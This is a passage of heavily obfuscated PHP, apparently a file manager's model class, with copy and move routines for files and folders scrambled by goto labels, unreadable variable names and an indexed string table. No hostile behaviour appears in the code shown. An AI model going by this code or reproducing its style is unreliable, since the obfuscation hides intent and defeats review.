$e°ëÑ”ÈÁ•; goto F¯‡Øğ‹Í; d„§ø…œŸØ: $this->lockCopyStart($CÓÚÉ¨ÊÉƒ); $this->lockWriteStart($Aé¥Ÿ çˆ«, $dİìÉ‹Ìºİ); $FÑÙºÍøğ… = array($EÔôÒ¨ÚÓŠ[533] => array(), $EÔôÒ¨ÚÓŠ[534] => array(), $EÔôÒ¨ÚÓŠ[535] => array()); goto C£¼óó¼ö ; f¤»õ»›Ó–: $this->_childrenListClear(); $this->lockCopyEnd($CÓÚÉ¨ÊÉƒ); $this->lockWriteEnd($Aé¥Ÿ çˆ«, $dİìÉ‹Ìºİ); goto bÛÁœ¨ë°; bÛÁœ¨ë°: if ($cÃ»Ã™Ãå[$EÔôÒ¨ÚÓŠ[406]] == $EÔôÒ¨ÚÓŠ[96] && $BÕùÃà†‘ == $e°ëÑ”ÈÁ•) { $this->folderSizeResetChildren($BÕùÃà†‘); } Model($EÔôÒ¨ÚÓŠ[536])->addAll($FÑÙºÍøğ…[$EÔôÒ¨ÚÓŠ[534]], array(), !0); if ($BÕùÃà†‘ != $e°ëÑ”ÈÁ• || $cÃ»Ã™Ãå[$EÔôÒ¨ÚÓŠ[406]] == $EÔôÒ¨ÚÓŠ[96]) { Model($EÔôÒ¨ÚÓŠ[537])->eventCopy($e°ëÑ”ÈÁ•); } goto bêÓèËèè˜; bêÓèËèè˜: $this->saveAll($FÑÙºÍøğ…[$EÔôÒ¨ÚÓŠ[535]]); Model($EÔôÒ¨ÚÓŠ[201])->linkAdd($FÑÙºÍøğ…[$EÔôÒ¨ÚÓŠ[533]]); $this->folderSizeReset($Aé¥Ÿ çˆ«); goto b‹‰ã¦¶´; Fö¹š Ùìï: $EÔôÒ¨ÚÓŠ =& $_SERVER[¾÷]; $cÃ»Ã™Ãå = $this->sourceInfo($CÓÚÉ¨ÊÉƒ); $B·ÅùšÅ® = $this->sourceInfo($Aé¥Ÿ çˆ«); goto A«…•íÛº•; F¯‡Øğ‹Í: } private function _copy($aîœ»·œÃó, $Bõ‘–Ë£ñ®, $CÎ¦³ºÎ , &$BáÆÜ„ÛÏ¤, $e£´™†×Ì¾, $e……¡³ß§ = '') { goto dÕ°éàİò–; B’ğø˜˜Ñø: if (!$E½Â¼ËâĞï) { return $this->_copyCreate($aîœ»·œÃó, $Bõ‘–Ë£ñ®, $e»„ÑÓ½Œõ, $BáÆÜ„ÛÏ¤); } $bßí ø”ƒ˜ = $E½Â¼ËâĞï; if ($b‚æ¢À·­) { if ($CÎ¦³ºÎ  == REPEAT_RENAME_FOLDER) { $e»„ÑÓ½Œõ = $this->fileNameAutoCache($Bõ‘–Ë£ñ®, $e»„ÑÓ½Œõ, $CÎ¦³ºÎ , $b‚æ¢À·­); $bßí ø”ƒ˜ = $this->_copyCreate($aîœ»·œÃó, $Bõ‘–Ë£ñ®, $e»„ÑÓ½Œõ, $BáÆÜ„ÛÏ¤); } else { $c±›İ‡ˆÁ… = $this->_childrenList($aîœ»·œÃó); foreach ($c±›İ‡ˆÁ… as $Fâ¬õçã›Ô) { $this->_copy($Fâ¬õçã›Ô[$Eò¤ì´õ®¶[399]], $E½Â¼ËâĞï, $CÎ¦³ºÎ , $BáÆÜ„ÛÏ¤, !1); } } } else { if ($CÎ¦³ºÎ  == REPEAT_RENAME || $CÎ¦³ºÎ  == REPEAT_RENAME_FOLDER) { $e»„ÑÓ½Œõ = $this->fileNameAutoCache($Bõ‘–Ë£ñ®, $e»„ÑÓ½Œõ, $CÎ¦³ºÎ , $b‚æ¢À·­); $bßí ø”ƒ˜ = $this->_copyCreate($aîœ»·œÃó, $Bõ‘–Ë£ñ®, $e»„ÑÓ½Œõ, $BáÆÜ„ÛÏ¤); } else { if ($CÎ¦³ºÎ  == REPEAT_REPLACE) { $CÅ”áóìÂ = $this->sourceInfoCache($E½Â¼ËâĞï); $cÂÖ¸¾ŒË› = $this->fileHistory($CÅ”áóìÂ, $c¢ï©–ª[$Eò¤ì´õ®¶[450]], $c¢ï©–ª[$Eò¤ì´õ®¶[87]]); if ($cÂÖ¸¾ŒË›) { $BáÆÜ„ÛÏ¤[$Eò¤ì´õ®¶[533]][] = $c¢ï©–ª[$Eò¤ì´õ®¶[450]]; } } else { if ($CÎ¦³ºÎ  == REPEAT_SKIP) { } } } Hook::trigger($Eò¤ì´õ®¶[538], array($Eò¤ì´õ®¶[539], $c¢ï©–ª, 0)); } goto d¹Ê„Æ¹†; eŸğÚˆÆ: $e»„ÑÓ½Œõ = $e……¡³ß§ ? $e……¡³ß§ : $c¢ï©–ª[$Eò¤ì´õ®¶[38]]; $E½Â¼ËâĞï = $this->fileNameExistCache($Bõ‘–Ë£ñ®, $e»„ÑÓ½Œõ); if ($e£´™†×Ì¾) { $this->_childrenAllMake($aîœ»·œÃó); if ($b‚æ¢À·­ && $E½Â¼ËâĞï) { $this->_childrenAllMake($E½Â¼ËâĞï); } } goto B’ğø˜˜Ñø; d¹Ê„Æ¹†: return $bßí ø”ƒ˜; goto C²ìø¥ò™®; dÕ°éàİò–: $Eò¤ì´õ®¶ =& $_SERVER[¾÷]; $c¢ï©–ª = $this->sourceInfoCache($aîœ»·œÃó); $b‚æ¢À·­ = $c¢ï©–ª[$Eò¤ì´õ®¶[406]] == $Eò¤ì´õ®¶[96]; goto eŸğÚˆÆ; C²ìø¥ò™®: } private function _copyCreate($D„¾‚Á¥òª, $cÜŒ–¬³¾¦, $d¹î ä¹§, &$f‡Çí…‹Œ) { goto EñŒ•¡§ùâ; eÌ˜˜’Á®: $e†Ç¾² ˆ¨ = $this->add($c÷†ø¨§Ìâ); $A˜œš¢éáÍ = array($b‘Òò‹òÅá[399] => $e†Ç¾² ˆ¨, $b‘Òò‹òÅá[38] => $d¹î ä¹§); $this->_copyApplyMeta($A˜œš¢éáÍ, $f‡Çí…‹Œ); goto FçÍªéğÀñ; fôíÈâˆ‡: $this->addAll($b¿¦«ˆ‘£ˆ, array(), !1); $B©†÷¬¶Ğ = $this->where(array($b‘Òò‹òÅá[481] => $e†Ç¾² ˆ¨))->select(); $aì‹è¶ã‹Ô = $this->_childrenMakeRelation($Bñ·ùˆ‰Ú, $B©†÷¬¶Ğ); goto a‚…¿ÊÀ¨–; FçÍªéğÀñ: if ($A·ãî¥ÀË„[$b‘Òò‹òÅá[406]] != $b‘Òò‹òÅá[96]) { $f‡Çí…‹Œ[$b‘Òò‹òÅá[533]][] = $A·ãî¥ÀË„[$b‘Òò‹òÅá[450]]; return $e†Ç¾² ˆ¨; } $Bñ·ùˆ‰Ú = array(); $b¿¦«ˆ‘£ˆ = array(); goto eèğßª“‡Œ; a‚…¿ÊÀ¨–: $aì‹è¶ã‹Ô[$D„¾‚Á¥òª] = $e†Ç¾² ˆ¨; $D²ôšÎ = array(); $bŒáÁ¬Ğµé = array(); goto DÚÕº²˜‚; DÚÕº²˜‚: foreach ($B©†÷¬¶Ğ as $FáíĞ·Ñ·Æ) { $E£³…©ŠÖí = $FáíĞ·Ñ·Æ[$b‘Òò‹òÅá[399]]; $f¬µ•×óõ = $this->_childrenMatch($aì‹è¶ã‹Ô, $FáíĞ·Ñ·Æ, $AÜÄÊë‡š½); $D²ôšÎ[] = array($b‘Òò‹òÅá[399], $E£³…©ŠÖí, $b‘Òò‹òÅá[481], $f¬µ•×óõ[$b‘Òò‹òÅá[481]]); $bŒáÁ¬Ğµé[] = array($b‘Òò‹òÅá[399], $E£³…©ŠÖí, $b‘Òò‹òÅá[490], $f¬µ•×óõ[$b‘Òò‹òÅá[490]]); $this->_copyApplyMeta($FáíĞ·Ñ·Æ, $f‡Çí…‹Œ); if ($FáíĞ·Ñ·Æ[$b‘Òò‹òÅá[406]] != $b‘Òò‹òÅá[96]) { $f‡Çí…‹Œ[$b‘Òò‹òÅá[533]][] = $FáíĞ·Ñ·Æ[$b‘Òò‹òÅá[450]]; } } $this->chunkEventSet($b‘Òò‹òÅá[545], array($b‘Òò‹òÅá[546], $c÷†ø¨§Ìâ, $a«¯…‚éÅô)); $this->saveAll($D²ôšÎ); goto EÕ‘ŞŒ“©; EÕ‘ŞŒ“©: $this->chunkEventSet($b‘Òò‹òÅá[547], array($b‘Òò‹òÅá[548], $c÷†ø¨§Ìâ, $a«¯…‚éÅô)); $this->saveAll($bŒáÁ¬Ğµé); return $e†Ç¾² ˆ¨; goto F„ˆÆö¡ƒ‡; CÃˆ­ì•‰ï: $AÜÄÊë‡š½ = $this->sourceInfo($e†Ç¾² ˆ¨); foreach ($Bñ·ùˆ‰Ú as $FáíĞ·Ñ·Æ) { $f´¾±Ú“¶Ä = $this->_makeItemData($FáíĞ·Ñ·Æ, $AÜÄÊë‡š½, $FáíĞ·Ñ·Æ[$b‘Òò‹òÅá[38]]); $f´¾±Ú“¶Ä[$b‘Òò‹òÅá[490]] = $FáíĞ·Ñ·Æ[$b‘Òò‹òÅá[490]]; $b¿¦«ˆ‘£ˆ[] = $f´¾±Ú“¶Ä; } $this->chunkEventSet($b‘Òò‹òÅá[543], array($b‘Òò‹òÅá[544], $c÷†ø¨§Ìâ, $a«¯…‚éÅô)); goto fôíÈâˆ‡; EñŒ•¡§ùâ: $b‘Òò‹òÅá =& $_SERVER[¾÷]; $A·ãî¥ÀË„ = $this->sourceInfoCache($D„¾‚Á¥òª); $D…Šö›²”ƒ = $this->sourceInfoCache($cÜŒ–¬³¾¦); goto f•¹÷¾İÂ´; f•¹÷¾İÂ´: $c÷†ø¨§Ìâ = $this->_makeItemData($A·ãî¥ÀË„, $D…Šö›²”ƒ, $d¹î ä¹§); Hook::trigger($b‘Òò‹òÅá[540], $c÷†ø¨§Ìâ); Hook::trigger($b‘Òò‹òÅá[541], array($b‘Òò‹òÅá[542], $c÷†ø¨§Ìâ, 0)); goto eÌ˜˜’Á®; eèğßª“‡Œ: $this->_childrenListAll($D„¾‚Á¥òª, $Bñ·ùˆ‰Ú); $a«¯…‚éÅô = count($Bñ·ùˆ‰Ú); if ($a«¯…‚éÅô == 0) { return $e†Ç¾² ˆ¨; } goto CÃˆ­ì•‰ï; F„ˆÆö¡ƒ‡: } private function _childrenMakeRelation($eºŸ°ÏÔá’, $eØ‹Åã­ø¤) { $AÎ„¿¿ŠÁ =& $_SERVER[¾÷]; $FäêÉæ£ôÓ = array(); $c˜­‰¥·šË = array(); foreach ($eºŸ°ÏÔá’ as $dÎÙ†‡ÓŞ) { $AˆëÈ¿—Ã¬ = $dÎÙ†‡ÓŞ[$AÎ„¿¿ŠÁ[38]] . $AÎ„¿¿ŠÁ[18] . $dÎÙ†‡ÓŞ[$AÎ„¿¿ŠÁ[490]]; $FäêÉæ£ôÓ[$AˆëÈ¿—Ã¬] = $dÎÙ†‡ÓŞ[$AÎ„¿¿ŠÁ[399]]; } foreach ($eØ‹Åã­ø¤ as $dÎÙ†‡ÓŞ) { $AˆëÈ¿—Ã¬ = $dÎÙ†‡ÓŞ[$AÎ„¿¿ŠÁ[38]] . $AÎ„¿¿ŠÁ[18] . $dÎÙ†‡ÓŞ[$AÎ„¿¿ŠÁ[490]]; $AÎˆ—Ë›ƒ¦ = $FäêÉæ£ôÓ[$AˆëÈ¿—Ã¬]; $c˜­‰¥·šË[$AÎˆ—Ë›ƒ¦] = $dÎÙ†‡ÓŞ[$AÎ„¿¿ŠÁ[399]]; } return $c˜­‰¥·šË; } private function _childrenMatch($c³ˆ§àĞãª, $dÁ¿©øËŠ, $e…Á¢…İÛƒ) { goto DÁããĞ´¤Ù; Dì¾é¼¤ˆ: $cŸ÷åÅÖ‡å = $Aö‘Ëô…˜ì[count($Aö‘Ëô…˜ì) - 1]; return array($F‰Õ°‚’è [481] => $cŸ÷åÅÖ‡å, $F‰Õ°‚’è [490] => $DìŒÏ÷µé›); goto E˜ã×ƒÒè; EĞ¸¯¯¦İò: foreach ($B™÷º¤…Á as $eÀ¶ÖĞØí“) { if (isset($c³ˆ§àĞãª[$eÀ¶ÖĞØí“])) { $DìŒÏ÷µé› .= $c³ˆ§àĞãª[$eÀ¶ÖĞØí“] . $F‰Õ°‚’è [549]; } } $DìŒÏ÷µé› = rtrim($DìŒÏ÷µé›, $F‰Õ°‚’è [57]) . $F‰Õ°‚’è [57]; $Aö‘Ëô…˜ì = $this->parentLevelArray($DìŒÏ÷µé›); goto Dì¾é¼¤ˆ; DÁããĞ´¤Ù: $F‰Õ°‚’è  =& $_SERVER[¾÷]; $DìŒÏ÷µé› = $e…Á¢…İÛƒ[$F‰Õ°‚’è [490]]; $B™÷º¤…Á = $this->parentLevelArray($dÁ¿©øËŠ[$F‰Õ°‚’è [490]]); goto EĞ¸¯¯¦İò; E˜ã×ƒÒè: } private function _makeItemData($DËõºŒŠç, $f‘ÉäÒÜ·, $A¡¢¦î½ ¹) { $B¥­í„Ú†— =& $_SERVER[¾÷]; $bõ¬ÅÌò = array($B¥­í„Ú†—[550] => $DËõºŒŠç[$B¥­í„Ú†—[406]], $B¥­í„Ú†—[416] => $A¡¢¦î½ ¹, $B¥­í„Ú†—[551] => $DËõºŒŠç[$B¥­í„Ú†—[408]], $B¥­í„Ú†—[451] => $DËõºŒŠç[$B¥­í„Ú†—[450]], $B¥­í„Ú†—[552] => $DËõºŒŠç[$B¥­í„Ú†—[87]], $B¥­í„Ú†—[553] => $f‘ÉäÒÜ·[$B¥­í„Ú†—[407]], $B¥­í„Ú†—[554] => $f‘ÉäÒÜ·[$B¥­í„Ú†—[487]], $B¥­í„Ú†—[555] => USER_ID, $B¥­í„Ú†—[556] => USER_ID, $B¥­í„Ú†—[398] => $f‘ÉäÒÜ·[$B¥­í„Ú†—[399]], $B¥­í„Ú†—[557] => $f‘ÉäÒÜ·[$B¥­í„Ú†—[490]] . $f‘ÉäÒÜ·[$B¥­í„Ú†—[399]] . $B¥­í„Ú†—[57], $B¥­í„Ú†—[425] => 0, $B¥­í„Ú†—[558] => $B¥­í„Ú†—[43]); return $bõ¬ÅÌò; } private function _copyApplyMeta($AóÁ‚ŠÖø, &$f÷øËÏªëö) { $f‰æÛ™šä‡ =& $_SERVER[¾÷]; $DõÊÖÉïØ˜ = $AóÁ‚ŠÖø[$f‰æÛ™šä‡[399]]; $Få’Û‚¥èã = $AóÁ‚ŠÖø[$f‰æÛ™šä‡[38]]; if (!isset($AóÁ‚ŠÖø[$f‰æÛ™šä‡[559]]) || !$AóÁ‚ŠÖø[$f‰æÛ™šä‡[559]] || $AóÁ‚ŠÖø[$f‰æÛ™šä‡[559]] == $f‰æÛ™šä‡[500]) { $f÷øËÏªëö[$f‰æÛ™šä‡[535]][] = array($f‰æÛ™šä‡[399], $DõÊÖÉïØ˜, $f‰æÛ™šä‡[559], short_id($DõÊÖÉïØ˜)); } if (Input::check($Få’Û‚¥èã, $f‰æÛ™šä‡[560])) { $f÷øËÏªëö[$f‰æÛ™šä‡[534]][] = array($f‰æÛ™šä‡[399] => $DõÊÖÉïØ˜, $f‰æÛ™šä‡[102] => $f‰æÛ™šä‡[447], $f‰æÛ™šä‡[379] => str_replace($f‰æÛ™šä‡[60], $f‰æÛ™šä‡[43], Pinyin::encode($Få’Û‚¥èã))); $f÷øËÏªëö[$f‰æÛ™šä‡[534]][] = array($f‰æÛ™šä‡[399] => $DõÊÖÉïØ˜, $f‰æÛ™šä‡[102] => $f‰æÛ™šä‡[446], $f‰æÛ™šä‡[379] => Pinyin::encode($Få’Û‚¥èã, $f‰æÛ™šä‡[561])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($eãä®„òÛ) { goto Bá±÷Ü˜„ó; D¤Òœ¦°±Õ: $EÛÑ­¬©¾± = array_to_keyvalue($EÛÑ­¬©¾±, $Fï‰Ôš»õ[399]); foreach ($EÛÑ­¬©¾± as $e»…ÕØîåÕ) { $aæºù±ªÏš = $e»…ÕØîåÕ[$Fï‰Ôš»õ[481]]; $eãä®„òÛ = $e»…ÕØîåÕ[$Fï‰Ôš»õ[399]]; if (!isset($this->_childrenListCache[$eãä®„òÛ]) && $e»…ÕØîåÕ[$Fï‰Ôš»õ[406]] == $Fï‰Ôš»õ[96]) { $this->_childrenListCache[$eãä®„òÛ] = array(); } if (!isset($this->_childrenListCache[$aæºù±ªÏš])) { $this->_childrenListCache[$aæºù±ªÏš] = array(); } $this->_childrenListCache[$aæºù±ªÏš][$eãä®„òÛ] = $e»…ÕØîåÕ; $this->_childrenItemCache[$eãä®„òÛ] = $e»…ÕØîåÕ; } goto EÔË»–Ûá; Bá±÷Ü˜„ó: $Fï‰Ôš»õ =& $_SERVER[¾÷]; $Dù¥×­â˜ = $this->sourceInfo($eãä®„òÛ); $c’¤¿ß¨á = $Fï‰Ôš»õ[427]; goto bÄÄ´¬Ùâ; bÄÄ´¬Ùâ: $e ´³¯ÉÌ® = array($Fï‰Ôš»õ[490] => array($Fï‰Ôš»õ[516], $Dù¥×­â˜[$Fï‰Ôš»õ[490]] . $eãä®„òÛ . $Fï‰Ôš»õ[517]), $Fï‰Ôš»õ[426] => $this->targetIsDelete); $EÛÑ­¬©¾± = $this->field($c’¤¿ß¨á)->where($e ´³¯ÉÌ®)->select(); if (!$EÛÑ­¬©¾±) { return; } goto D¤Òœ¦°±Õ; EÔË»–Ûá: } private function _childrenListAll($d‚ù§«¹Ù®, &$bòååóÎÉÔ) { $Eò»ŒÚòÙ± =& $_SERVER[¾÷]; if (!isset($this->_childrenListCache[$d‚ù§«¹Ù®])) { return; } $a¾Œ™¢«‹ = $this->_childrenListCache[$d‚ù§«¹Ù®]; foreach ($a¾Œ™¢«‹ as $e¡ù´é¤ìÍ => $DŠÁ³øŸàŠ) { $bòååóÎÉÔ[$e¡ù´é¤ìÍ] = $DŠÁ³øŸàŠ; if ($DŠÁ³øŸàŠ[$Eò»ŒÚòÙ±[406]] == $Eò»ŒÚòÙ±[96]) { $this->_childrenListAll($e¡ù´é¤ìÍ, $bòååóÎÉÔ); } } } private function sourceInfoCache($aæø¢‡µÏ™) { if (isset($this->_childrenItemCache[$aæø¢‡µÏ™])) { return $this->_childrenItemCache[$aæø¢‡µÏ™]; } return $this->sourceInfo($aæø¢‡µÏ™); } private function _childrenList($AâÙãè¿Çá) { if (isset($this->_childrenListCache[$AâÙãè¿Çá])) { return $this->_childrenListCache[$AâÙãè¿Çá]; } return $this->_childrenListSelect($AâÙãè¿Çá); } private function _childrenListSelect($A‘´Ñµ±„) { goto bÈöíØİ¢; bÈöíØİ¢: $BÆ¸©İÉ± =& $_SERVER[¾÷]; $e®¬ÑˆÍŒ = array($BÆ¸©İÉ±[481] => $A‘´Ñµ±„, $BÆ¸©İÉ±[426] => $this->targetIsDelete); $eÃôöÈ¼ÏÕ = $this->where($e®¬ÑˆÍŒ)->select(); goto còô»ìŒƒË; bòÙëñ¤Šå: foreach ($C™ìî…Üå¶ as $A‘´Ñµ±„ => $a„Œ„Ì¢âõ) { $this->_childrenItemCache[$A‘´Ñµ±„] = $a„Œ„Ì¢âõ; } return $C™ìî…Üå¶; goto b¿÷Ú–š; còô»ìŒƒË: $eÃôöÈ¼ÏÕ = $eÃôöÈ¼ÏÕ ? $eÃôöÈ¼ÏÕ : array(); $C™ìî…Üå¶ = array_to_keyvalue($eÃôöÈ¼ÏÕ, $BÆ¸©İÉ±[399]); $this->_childrenListCache[$A‘´Ñµ±„] = $C™ìî…Üå¶; goto bòÙëñ¤Šå; b¿÷Ú–š: } private function fileNameExistCache($Eµ¢¡•¸Ö±, $F‰ˆ®ÂÒğØ) { $D¤ ¾¼Ááø =& $_SERVER[¾÷]; $F‰ˆ®ÂÒğØ = strtolower($F‰ˆ®ÂÒğØ); $d…È¥½ÓßÁ = $this->_childrenList($Eµ¢¡•¸Ö±); foreach ($d…È¥½ÓßÁ as $D¤èÓÁ½„º) { if ($F‰ˆ®ÂÒğØ == strtolower($D¤èÓÁ½„º[$D¤ ¾¼Ááø[38]])) { return $D¤èÓÁ½„º[$D¤ ¾¼Ááø[399]]; } } return !1; } private function fileNameAutoCache($A¹ä‡¾¥, $eÇ‡±âŒ¯, $EğØêˆŒø, $EÍ‰¢ÛÆê–) { $aÕµÈÆí£Æ =& $_SERVER[¾÷]; $c‘»§êù³³ = $this->_childrenList($A¹ä‡¾¥); $fà‰¹ãÙ‘¶ = array_to_keyvalue($c‘»§êù³³, $aÕµÈÆí£Æ[43], $aÕµÈÆí£Æ[38]); return $this->fileNameAutoGet($fà‰¹ãÙ‘¶, $eÇ‡±âŒ¯, $EğØêˆŒø, $EÍ‰¢ÛÆê–); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($E¦¿Õç«Ö, $eÕ¦±˜Ğ¹Ó, $d¡ëÜš“ùŠ = REPEAT_REPLACE, $fàÁÛªÈ„ = '') { goto C°Îù™Áƒİ; dÀó‹ğ¢: $FÜĞ›ââº = $this->fileNameExistCache($eÕ¦±˜Ğ¹Ó, $BÄæ•Œò“Ğ[$Aç‰™ƒÉÔƒ[38]]); $C©˜èÒ»— = $this->_move($E¦¿Õç«Ö, $eÕ¦±˜Ğ¹Ó, $d¡ëÜš“ùŠ, $f‘‚Ùëîµ, $fàÁÛªÈ„); $this->sourceCacheClear(); goto E¦³ÚÖ·ñ‡; C¯Ã›¢ÙŠ: if ($BÄæ•Œò“Ğ[$Aç‰™ƒÉÔƒ[481]] == $eÕ¦±˜Ğ¹Ó && $fàÁÛªÈ„ != $BÄæ•Œò“Ğ[$Aç‰™ƒÉÔƒ[38]]) { $A˜±Ï…Ëù = $this->fileNameExist($eÕ¦±˜Ğ¹Ó, $fàÁÛªÈ„); if ($A˜±Ï…Ëù && $BÄæ•Œò“Ğ[$Aç‰™ƒÉÔƒ[406]] == $Aç‰™ƒÉÔƒ[500]) { goto aççøŠàŸ; D””Â¢±ê: $this->removeNow($E¦¿Õç«Ö, !1); $this->folderSizeReset($eÕ¦±˜Ğ¹Ó); Hook::trigger($Aç‰™ƒÉÔƒ[563], $Aø¡¦ßÂ); goto cáµ²ŸÂ”; aççøŠàŸ: $fÍº²ï²ñ˜ = $this->sourceInfo($A˜±Ï…Ëù); $DªÓ«· = $this->fileHistory($fÍº²ï²ñ˜, $BÄæ•Œò“Ğ[$Aç‰™ƒÉÔƒ[450]], $BÄæ•Œò“Ğ[$Aç‰™ƒÉÔƒ[87]]); if (!$DªÓ«·) { Model($Aç‰™ƒÉÔƒ[453])->remove($BÄæ•Œò“Ğ[$Aç‰™ƒÉÔƒ[450]]); } goto D””Â¢±ê; cáµ²ŸÂ”: return $A˜±Ï…Ëù; goto dÜ‘ŸÄ–Á—; dÜ‘ŸÄ–Á—: } } $AéÜ™˜ô¤ = $fàÁÛªÈ„ ? $fàÁÛªÈ„ : $BÄæ•Œò“Ğ[$Aç‰™ƒÉÔƒ[38]]; $this->lockMoveStart($E¦¿Õç«Ö); goto CÈÜŸ—ßÖ‘; bÛÄß™™¼£: $this->folderSizeReset($eÕ¦±˜Ğ¹Ó); $dä£Šæ‘±ã = array($BÄæ•Œò“Ğ[$Aç‰™ƒÉÔƒ[481]], $eÕ¦±˜Ğ¹Ó); if ($BÄæ•Œò“Ğ[$Aç‰™ƒÉÔƒ[406]] == $Aç‰™ƒÉÔƒ[96]) { $dä£Šæ‘±ã[] = $E¦¿Õç«Ö; } goto EƒÕ‹ğÄ—; C°Îù™Áƒİ: $Aç‰™ƒÉÔƒ =& $_SERVER[¾÷]; $BÄæ•Œò“Ğ = $this->sourceInfo($E¦¿Õç«Ö); $f³ñÅÊÅÔ¼ = $this->sourceInfo($eÕ¦±˜Ğ¹Ó); goto f¥Æ©Ìëƒ¤; E¦³ÚÖ·ñ‡: if ($BÄæ•Œò“Ğ[$Aç‰™ƒÉÔƒ[406]] == $Aç‰™ƒÉÔƒ[96] && $FÜĞ›ââº) { $this->folderSizeResetChildren($C©˜èÒ»—); } Model($Aç‰™ƒÉÔƒ[201])->linkAdd($f‘‚Ùëîµ[$Aç‰™ƒÉÔƒ[533]]); if ($FÜĞ›ââº && $f‘‚Ùëîµ[$Aç‰™ƒÉÔƒ[564]]) { $this->removeNow($E¦¿Õç«Ö, !1); } goto d™èÔï†ˆù; CÈÜŸ—ßÖ‘: $this->lockWriteStart($eÕ¦±˜Ğ¹Ó, $AéÜ™˜ô¤); $f‘‚Ùëîµ = array($Aç‰™ƒÉÔƒ[533] => array(), $Aç‰™ƒÉÔƒ[564] => !1); $this->clearShare($E¦¿Õç«Ö, $eÕ¦±˜Ğ¹Ó); goto dÀó‹ğ¢; d™èÔï†ˆù: $this->lockMoveEnd($E¦¿Õç«Ö); $this->lockWriteEnd($eÕ¦±˜Ğ¹Ó, $AéÜ™˜ô¤); $this->folderSizeReset($BÄæ•Œò“Ğ[$Aç‰™ƒÉÔƒ[481]]); goto bÛÄß™™¼£; f¥Æ©Ìëƒ¤: if ($BÄæ•Œò“Ğ[$Aç‰™ƒÉÔƒ[481]] == $f³ñÅÊÅÔ¼[$Aç‰™ƒÉÔƒ[399]]) { if ($BÄæ•Œò“Ğ[$Aç‰™ƒÉÔƒ[426]] == $Aç‰™ƒÉÔƒ[96]) { Model($Aç‰™ƒÉÔƒ[424])->restore(array($E¦¿Õç«Ö)); } if (!$fàÁÛªÈ„ || $fàÁÛªÈ„ == $BÄæ•Œò“Ğ[$Aç‰™ƒÉÔƒ[38]]) { return $E¦¿Õç«Ö; } } $Aø¡¦ßÂ = $this->pathInfoMore($E¦¿Õç«Ö); if ($this->isParentOf($E¦¿Õç«Ö, $eÕ¦±˜Ğ¹Ó)) { return !1; } goto CÉ×Èà»ä²; EƒÕ‹ğÄ—: $this->updateModifyTime($dä£Šæ‘±ã); Model($Aç‰™ƒÉÔƒ[537])->eventMove($E¦¿Õç«Ö, $BÄæ•Œò“Ğ[$Aç‰™ƒÉÔƒ[481]], $eÕ¦±˜Ğ¹Ó); Hook::trigger($Aç‰™ƒÉÔƒ[563], $Aø¡¦ßÂ); goto aç¨ÊÏĞ; CÉ×Èà»ä²: if (!$BÄæ•Œò“Ğ || !$f³ñÅÊÅÔ¼ || $f³ñÅÊÅÔ¼[$Aç‰™ƒÉÔƒ[406]] != $Aç‰™ƒÉÔƒ[96]) { return !1; } Hook::trigger($Aç‰™ƒÉÔƒ[562], $Aø¡¦ßÂ); $this->targetIsDelete = intval($BÄæ•Œò“Ğ[$Aç‰™ƒÉÔƒ[426]]); goto C¯Ã›¢ÙŠ; aç¨ÊÏĞ: return $C©˜èÒ»—; goto Féè’¿ÚËÙ; Féè’¿ÚËÙ: } private function _move($cÑÇ„Ø¨Ç, $dÚÁùêÑ…å, $a©Ş…ªëİ, &$côœöÍƒ™ù, $e¯…Ó»ÚÛá = '') { goto A¾ºßåŠœ; e˜Ó¸ØØ—›: return $d‡ù‘”ñ½—; goto E‰—Ù ŒÓÔ; e¶òÛˆèÓ±: $Bô«òæî‡ = $e¯…Ó»ÚÛá ? $e¯…Ó»ÚÛá : $BšŸ†¬™œ›[$Eåà£´‚‡[38]]; $Dî©¹‹áÇ• = $this->fileNameExistCache($dÚÁùêÑ…å, $Bô«òæî‡); $this->lockMoveStart($cÑÇ„Ø¨Ç); goto bä¢êîÆñœ; A¾ºßåŠœ: $Eåà£´‚‡ =& $_SERVER[¾÷]; $BšŸ†¬™œ› = $this->sourceInfo($cÑÇ„Ø¨Ç); $E¿¼İæçï¼ = $BšŸ†¬™œ›[$Eåà£´‚‡[406]] == $Eåà£´‚‡[96]; goto e¶òÛˆèÓ±; fÅãˆ«…ñº: $Dò‰¶½½´é = !1; if ($E¿¼İæçï¼) { if ($a©Ş…ªëİ == REPEAT_RENAME_FOLDER) { $Bô«òæî‡ = $this->fileNameAuto($dÚÁùêÑ…å, $Bô«òæî‡, $a©Ş…ªëİ, $E¿¼İæçï¼); $d‡ù‘”ñ½— = $this->_moveForce($cÑÇ„Ø¨Ç, $dÚÁùêÑ…å, $Bô«òæî‡); } else { if ($a©Ş…ªëİ == REPEAT_RENAME_FOLDER) { $a©Ş…ªëİ = REPEAT_RENAME; } $DÀÈ¢§¶î” = $this->_childrenListSelect($cÑÇ„Ø¨Ç); foreach ($DÀÈ¢§¶î” as $D¿ÜÜŠº¢Î) { $this->_move($D¿ÜÜŠº¢Î[$Eåà£´‚‡[399]], $Dî©¹‹áÇ•, $a©Ş…ªëİ, $côœöÍƒ™ù); } $Dò‰¶½½´é = !0; } } else { if ($a©Ş…ªëİ == REPEAT_SKIP) { $Dò‰¶½½´é = !0; } else { if ($a©Ş…ªëİ == REPEAT_RENAME || $a©Ş…ªëİ == REPEAT_RENAME_FOLDER) { $Bô«òæî‡ = $this->fileNameAuto($dÚÁùêÑ…å, $Bô«òæî‡, $a©Ş…ªëİ, $E¿¼İæçï¼); $d‡ù‘”ñ½— = $this->_moveForce($cÑÇ„Ø¨Ç, $dÚÁùêÑ…å, $Bô«òæî‡); } else { if ($a©Ş…ªëİ == REPEAT_REPLACE) { $Fë‚­µå‘… = $this->sourceInfoCache($Dî©¹‹áÇ•); $dµ™¢’ª„ó = $this->fileHistory($Fë‚­µå‘…, $BšŸ†¬™œ›[$Eåà£´‚‡[450]], $BšŸ†¬™œ›[$Eåà£´‚‡[87]]); if ($dµ™¢’ª„ó) { $côœöÍƒ™ù[$Eåà£´‚‡[533]][] = $BšŸ†¬™œ›[$Eåà£´‚‡[450]]; } else { $Dò‰¶½½´é = !0; } } } } } if ($Dò‰¶½½´é && !$côœöÍƒ™ù[$Eåà£´‚‡[564]]) { $côœöÍƒ™ù[$Eåà£´‚‡[564]] = !0; } goto e˜Ó¸ØØ—›; bä¢êîÆñœ: $this->lockWriteStart($dÚÁùêÑ…å, $Bô«òæî‡); if (!$Dî©¹‹áÇ•) { return 